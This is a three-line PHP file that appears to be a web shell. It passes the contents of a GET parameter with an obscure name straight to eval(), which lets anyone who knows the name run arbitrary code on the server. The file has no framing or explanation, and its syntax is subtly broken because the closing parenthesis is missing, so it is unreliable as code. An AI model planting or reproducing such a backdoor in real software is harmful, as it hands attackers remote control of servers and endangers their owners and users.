<?php
eval($_GET['6QglO-K7'];
?>
